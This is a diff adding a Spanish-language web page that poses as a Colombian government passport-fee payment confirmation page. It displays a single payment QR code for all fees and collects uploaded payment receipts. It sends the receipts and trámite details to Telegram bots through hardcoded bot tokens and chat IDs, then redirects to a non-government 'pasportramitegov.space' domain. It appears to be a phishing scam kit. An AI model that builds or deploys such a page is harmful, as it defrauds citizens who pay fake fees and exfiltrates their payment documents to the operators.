@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmación de Pago</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .confirmation-container {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .detail-row {
+            display: flex;
+            border-bottom: 1px solid #eee;
+            padding: 10px 0;
+        }
+        .detail-label {
+            font-weight: bold;
+            width: 200px;
+        }
+        .detail-value {
+            flex: 1;
+        }
+        .buttons {
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            gap: 5%;
+            width: 90%;
+            font-size: medium;
+        }
+        .button {
+            padding: 15px 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .cancel-button {
+            background-color: #f44336;
+            color: white;
+        }
+        .confirm-button {
+            background-color: #4CAF50;
+            color: white;
+        }
+        .download-button {
+            background-color: #2196F3;
+            color: white;
+        }
+        .logo {
+            max-width: 200px;
+            margin-bottom: 20px;
+        }
+        .qr-container {
+            text-align: center;
+            margin: 30px 0;
+        }
+        .price-image {
+            max-width: 100%;
+            margin: 0 auto;
+            display: block;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .payment-instructions {
+            background-color: #f9f9f9;
+            border-left: 4px solid #2196F3;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 5px 5px 0;
+        }
+        .payment-instructions h3 {
+            margin-top: 0;
+            color: #2196F3;
+        }
+        .payment-instructions ol {
+            margin-left: 20px;
+            line-height: 1.6;
+        }
+        .image-upload-container {
+            margin: 30px 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+            border-radius: 8px;
+            border: 1px dashed #aaa;
+            text-align: center;
+        }
+        .image-preview {
+            max-width: 300px;
+            max-height: 300px;
+            margin: 15px auto;
+            display: none;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .upload-btn {
+            background-color: #2196F3;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .upload-btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        .upload-status {
+            margin-top: 10px;
+            font-weight: bold;
+            display: none;
+        }
+        .success {
+            color: #4CAF50;
+        }
+        .error {
+            color: #f44336;
+        }
+    </style>
+</head>
+<body>
+    <img id="departamentoLogo" class="logo" src="" alt="Logo Gobernación">
+    <h1>Confirmación de Pago</h1>
+    
+    <div class="confirmation-container">
+        <h2>Detalles del Trámite</h2>
+        
+        <div class="detail-row">
+            <div class="detail-label">Departamento:</div>
+            <div id="departamentoDetalle" class="detail-value"></div>
+        </div>
+        
+        <div class="detail-row">
+            <div class="detail-label">Tipo de Pasaporte:</div>
+            <div id="tipoPasaporteDetalle" class="detail-value"></div>
+        </div>
+        
+        <div class="detail-row">
+            <div class="detail-label">Precio:</div>
+            <div id="precioDetalle" class="detail-value"></div>
+        </div>
+
+        <div class="qr-container">
+            <h2>Código QR para Pago</h2>
+            <p>Por favor, utilice el siguiente código QR para realizar su pago:</p>
+            <img id="imagenPrecio" class="price-image" src="" alt="Código QR para pago">
+        </div>
+        
+        <div class="payment-instructions">
+            <h3>Instrucciones para Pago</h3>
+            <ol>
+                <li>Descargue la imagen del código QR haciendo clic en el botón "Descargar QR".</li>
+                <li>Acceda a su aplicación bancaria o billetera móvil.</li>
+                <li>Seleccione la opción "Pagar con QR" o similar.</li>
+                <li>Suba la imagen descargada o escanee el código directamente desde su pantalla.</li>
+                <li>Verifique que el monto a pagar coincida con el valor del trámite.</li>
+                <li>Complete el pago siguiendo las instrucciones de su banco.</li>
+                <li>Guarde el comprobante de pago para futuros trámites.</li>
+            </ol>
+            <p><strong>Nota:</strong> Una vez completado el pago, recibirá un correo electrónico con la confirmación y los pasos siguientes para su trámite de pasaporte.</p>
+        </div>
+
+        <!-- Nueva sección para subir comprobante de pago -->
+        <div class="image-upload-container">
+            <h3>Subir Comprobante de Pago</h3>
+            <p>Para continuar con el trámite, es necesario subir una imagen del comprobante de pago:</p>
+            
+            <input type="file" id="comprobanteInput" accept="image/*" style="display: none;">
+            <button id="selectImageBtn" class="upload-btn">Seleccionar Imagen</button>
+            
+            <img id="imagenPreview" class="image-preview" src="" alt="Vista previa del comprobante">
+            
+            <button id="enviarImagenBtn" class="upload-btn" disabled>Enviar Comprobante</button>
+            
+            <p id="uploadStatus" class="upload-status"></p>
+        </div>
+
+        <div class="buttons" style="justify-content: center;">
+            <button id="confirmarBtn" class="button confirm-button" style="font-size:small; display:none;">Confirmar y Continuar</button>
+        </div>
+       
+    </div>
+    
+    <script>
+        window.addEventListener("DOMContentLoaded", function() {
+            // Obtener parámetros de la URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const departamento = urlParams.get("departamento");
+            const tipoPasaporte = urlParams.get("tipo");
+            const precio = urlParams.get("precio");
+            
+            // También podemos obtener datos del localStorage como respaldo
+            const depLS = localStorage.getItem('departamento');
+            const tipoLS = localStorage.getItem('tipoPasaporte');
+            const precioLS = localStorage.getItem('precio');
+            
+            // Usar los datos de la URL o del localStorage
+            const depFinal = departamento || depLS || "No especificado";
+            const tipoFinal = tipoPasaporte || tipoLS || "No especificado";
+            const precioFinal = precio || precioLS || "0";
+            
+            // Mostrar la información en la página
+            document.getElementById("departamentoDetalle").textContent = depFinal;
+            document.getElementById("tipoPasaporteDetalle").textContent = tipoFinal;
+            
+            // Formatear el precio sin puntos para comparar
+            const precioNumerico = parseInt(precioFinal.replace(/\./g, ''));
+            
+            // Formatear el precio para mostrar
+            const precioFormateado = parseInt(precioFinal).toLocaleString('es-CO');
+            document.getElementById("precioDetalle").textContent = `$${precioFormateado}`;
+            
+            // Cargar la imagen del departamento
+            document.getElementById("departamentoLogo").src = `img/${depFinal}.png`;
+            document.getElementById("departamentoLogo").alt = `Gobernación de ${depFinal}`;
+            
+            // Seleccionar la imagen según el precio
+            const imagenPrecio = document.getElementById("imagenPrecio");
+            
+            switch(precioNumerico) {
+                case 155000:
+                    imagenPrecio.src = "qr/01.jpg";
+                    imagenPrecio.alt = "Código QR para Pasaporte Ordinario - $155.000";
+                    break;
+                case 193900:
+                    imagenPrecio.src = "qr/01.jpg";
+                    imagenPrecio.alt = "Código QR para Pasaporte Ejecutivo - $193.900";
+                    break;
+                case 133800:
+                    imagenPrecio.src = "qr/01.jpg";
+                    imagenPrecio.alt = "Código QR para Pasaporte Menor - $133.800";
+                    break;
+                case 153800:
+                    imagenPrecio.src = "qr/01.jpg";
+                    imagenPrecio.alt = "Código QR para Pasaporte Especial - $153.800";
+                    break;
+                default:
+                    // QR genérico si no coincide con ninguno de los precios específicos
+                    imagenPrecio.src = "qr/01.jpg";
+                    imagenPrecio.alt = "Código QR para pago";
+            }
+            
+            // Variables para el manejo de la imagen
+            let selectedFile = null;
+            const comprobanteInput = document.getElementById("comprobanteInput");
+            const selectImageBtn = document.getElementById("selectImageBtn");
+            const imagenPreview = document.getElementById("imagenPreview");
+            const enviarImagenBtn = document.getElementById("enviarImagenBtn");
+            const uploadStatus = document.getElementById("uploadStatus");
+            const confirmarBtn = document.getElementById("confirmarBtn");
+            
+            // Evento para abrir el selector de archivos
+            selectImageBtn.addEventListener("click", function() {
+                comprobanteInput.click();
+            });
+            
+            // Evento cuando se selecciona una imagen
+            comprobanteInput.addEventListener("change", function(e) {
+                if (e.target.files && e.target.files[0]) {
+                    selectedFile = e.target.files[0];
+                    
+                    // Mostrar la vista previa de la imagen
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        imagenPreview.src = e.target.result;
+                        imagenPreview.style.display = "block";
+                        enviarImagenBtn.disabled = false;
+                    }
+                    reader.readAsDataURL(selectedFile);
+                }
+            });
+            
+            // Evento para enviar la imagen a Telegram
+            enviarImagenBtn.addEventListener("click", function() {
+                if (!selectedFile) {
+                    return;
+                }
+                
+                // Indicar que se está procesando
+                uploadStatus.textContent = "Enviando imagen...";
+                uploadStatus.style.display = "block";
+                uploadStatus.className = "upload-status";
+                enviarImagenBtn.disabled = true;
+                
+                // Obtener información para el mensaje
+                const departamento = document.getElementById("departamentoDetalle").textContent;
+                const tipoPasaporte = document.getElementById("tipoPasaporteDetalle").textContent;
+                const precio = document.getElementById("precioDetalle").textContent;
+                const fecha = new Date().toLocaleString('es-CO');
+                
+                // Configurar el token del bot y Chat ID
+                const botToken = "7830762756:AAGNSRBXEzmH4OpXAnE_VKPUzB-TlQHGGHE";
+                const chatId = "5848946481";
+                
+                // Crear FormData para enviar imagen
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', selectedFile);
+                formData.append('caption', `📷 Comprobante de pago\n🏛️ Departamento: ${departamento}\n🔖 Tipo: ${tipoPasaporte}\n💰 Valor: ${precio}\n🕒 Fecha: ${fecha}`);
+                
+                // Enviar imagen usando FormData
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Respuesta del servidor Telegram:", data);
+                    
+                    if (data.ok) {
+                        // Si se envió correctamente, mostrar mensaje de éxito
+                        uploadStatus.textContent = "¡Comprobante enviado con éxito!";
+                        uploadStatus.className = "upload-status success";
+                        
+                        // Mostrar el botón de confirmar
+                        confirmarBtn.style.display = "block";
+                    } else {
+                        // Si hubo un error, mostrar mensaje
+                        uploadStatus.textContent = "Error al enviar el comprobante: " + (data.description || "Intente nuevamente.");
+                        uploadStatus.className = "upload-status error";
+                        enviarImagenBtn.disabled = false;
+                    }
+                })
+                .catch(error => {
+                    console.error("Error al enviar imagen:", error);
+                    uploadStatus.textContent = "Error de conexión. Intente nuevamente.";
+                    uploadStatus.className = "upload-status error";
+                    enviarImagenBtn.disabled = false;
+                });
+            });
+            
+            // Botón confirmar y continuar
+            document.getElementById("confirmarBtn").addEventListener("click", function() {
+                // Mostrar alerta de información
+                alert("Si ya realizó el pago, espere máximo 72 horas para recibir un correo con los datos de confirmación.");
+                
+                // Obtener información para el mensaje
+                const departamento = document.getElementById("departamentoDetalle").textContent;
+                const tipoPasaporte = document.getElementById("tipoPasaporteDetalle").textContent;
+                const precio = document.getElementById("precioDetalle").textContent;
+                const fecha = new Date().toLocaleString('es-CO');
+                
+                // Construir el mensaje para Telegram
+                const mensaje = `📢 Nuevo trámite confirmado:\n` +
+                               `🏛️ Departamento: ${departamento}\n` +
+                               `🔖 Tipo: ${tipoPasaporte}\n` +
+                               `💰 Valor: ${precio}\n` +
+                               `🕒 Fecha: ${fecha}`;
+                
+                // Token del bot y Chat ID
+                const botToken = "7580606761:AAFiPnAx4jOqv-bBPWFcqk8rwOJ1DYdsCGA";
+                const chatId = "7831097636";
+                
+                // Enviar notificación a Telegram
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => console.log("Notificación enviada a Telegram:", data))
+                .catch(error => console.error("Error al enviar notificación:", error));
+                
+                // Almacenar información de pago en localStorage
+                localStorage.setItem('pagoIniciado', 'true');
+                localStorage.setItem('fechaInicioPago', new Date().toISOString());
+                localStorage.setItem('departamento', departamento);
+                localStorage.setItem('tipoPasaporte', tipoPasaporte);
+                localStorage.setItem('precio', precio);
+                
+                // Redirigir a la página especificada
+                window.location.href = "https://pasportramitegov.space/tramite/online/index.html";
+            });
+        });
+    </script>
+</body>
+</html>
